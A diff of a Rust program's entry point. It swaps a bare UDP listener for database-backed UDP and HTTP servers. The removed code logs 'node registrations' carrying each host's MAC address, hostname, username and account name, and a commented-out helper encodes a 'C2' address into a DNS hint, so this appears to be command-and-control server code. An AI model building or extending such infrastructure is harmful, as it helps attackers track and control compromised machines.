@@ -1,94 +1,39 @@
+mod db;
+mod node;
+mod web;
+
 use std::net::SocketAddr;
 
-use tokio::net::UdpSocket;
-
 #[tokio::main]
-async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    start_udp_listener().await;
+async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
+    let database_url = std::env::var("DATABASE_URL").map_err(|_| "DATABASE_URL must be set")?;
+    let db_pool = db::connect(&database_url).await?;
+    db::run_migrations(&db_pool).await?;
+
+    let udp_bind: SocketAddr = std::env::var("UDP_BIND")
+        .unwrap_or_else(|_| "0.0.0.0:8888".into())
+        .parse()
+        .map_err(|e: std::net::AddrParseError| format!("UDP_BIND: {e}"))?;
+
+    let http_bind: SocketAddr = std::env::var("HTTP_BIND")
+        .unwrap_or_else(|_| "0.0.0.0:8080".into())
+        .parse()
+        .map_err(|e: std::net::AddrParseError| format!("HTTP_BIND: {e}"))?;
+
+    let udp_db_pool = db_pool.clone();
+    let udp_task = tokio::spawn(async move {
+        if let Err(e) = node::run(udp_db_pool, udp_bind).await {
+            eprintln!("udp server error: {e}");
+        }
+    });
+
+    let web_db_pool = db_pool.clone();
+    let web_task = tokio::spawn(async move {
+        if let Err(e) = web::serve(web_db_pool, http_bind).await {
+            eprintln!("http server error: {e}");
+        }
+    });
+
+    let _ = tokio::join!(udp_task, web_task);
     Ok(())
 }
-
-async fn start_udp_listener() {
-    let sock = UdpSocket::bind("0.0.0.0:8888").await.unwrap();
-
-    let mut buf = [0u8; 1024];
-    loop {
-        let (len, addr) = sock.recv_from(&mut buf).await.unwrap();
-        println!("{:?} bytes received from {:?}", len, addr);
-
-        if buf[0] != 77 || buf[1] != 33 {
-            println!("discarded payload. does not have proper starting bits.");
-            continue;
-        }
-
-        if buf[2] == 1 {
-            // node registration
-            handle_node_registration(addr, buf, len).await;
-        }
-
-        sock.send_to(b"ACK", addr).await.unwrap();
-    }
-}
-
-async fn handle_node_registration(addr: SocketAddr, buf: [u8; 1024], len: usize) {
-    let mut idx: usize = 3;
-
-    let nodus_id: [u8; 32] = buf[idx..(idx + 32)].try_into().unwrap();
-    idx += 32;
-
-    let mac_addr = buf[idx..(idx + 6)]
-        .iter()
-        .map(|b| format!("{:02x}", b))
-        .collect::<Vec<_>>()
-        .join(":");
-    idx += 6;
-
-    let asym_sec_algo = buf[idx];
-    idx += 1;
-
-    let asym_sec_pubkey_len = u16::from_be_bytes([buf[idx], buf[idx + 1]]) as usize;
-    idx += 2;
-
-    let asym_sec_pubkey = buf[idx..(idx + asym_sec_pubkey_len)].to_vec();
-    idx += asym_sec_pubkey_len;
-
-    let (cpu_arch, cpu_arch_len) = read_bytes_segment_as_string(&buf, idx);
-    idx += cpu_arch_len;
-
-    let (hostname, hostname_len) = read_bytes_segment_as_string(&buf, idx);
-    idx += hostname_len;
-
-    let (username, username_len) = read_bytes_segment_as_string(&buf, idx);
-    idx += username_len;
-
-    let (device_name, device_name_len) = read_bytes_segment_as_string(&buf, idx);
-    idx += device_name_len;
-
-    let (account_name, account_name_len) = read_bytes_segment_as_string(&buf, idx);
-    idx += account_name_len;
-
-    println!("mac: {}", mac_addr);
-    println!("cpu_arch: {}", cpu_arch);
-    println!("hostname: {}", hostname);
-    println!("username: {}", username);
-    println!("device_name: {}", device_name);
-    println!("account_name: {}", account_name);
-}
-
-fn read_bytes_segment_as_string(buf: &[u8; 1024], index: usize) -> (String, usize) {
-    let len = u16::from_be_bytes([buf[index], buf[index + 1]]) as usize;
-    if len < 1 {
-        return ("".into(), 2);
-    }
-    let bytes = buf[(index + 2)..(index + 2 + len)].to_vec();
-    (String::from_utf8(bytes).unwrap(), len + 2)
-}
-
-// fn build_dns_hint() -> String {
-//     // C2 IPv4 address: 4 bytes - if 0.0.0.0, then localhost (which is during dev/demo)
-//     let port: u16 = 8888;
-//     let port_bytes = port.to_be_bytes();
-//     let bytes: [u8; 7] = [0, 0, 0, 0, port_bytes[0], port_bytes[1], 0x01];
-
-//     base85::encode(&bytes)
-// }
